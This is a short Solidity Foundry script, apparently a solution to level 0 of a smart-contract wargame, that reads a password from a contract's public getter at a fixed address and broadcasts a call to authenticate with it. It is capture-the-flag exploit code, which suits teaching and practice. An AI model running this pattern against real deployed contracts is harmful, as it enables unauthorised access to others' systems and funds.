// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../instances/Ilevel00.sol";
import "forge-std/Test.sol";

contract Attacker is Test {
    Instance level0 = Instance(0x962E1d80D48fBF697Fa4cE311711e8f3B5D93AC4);

    function test() external {
        vm.startBroadcast();
        string memory passKey = level0.password();
        level0.authenticate(passKey);
        vm.stopBroadcast();
    }
}
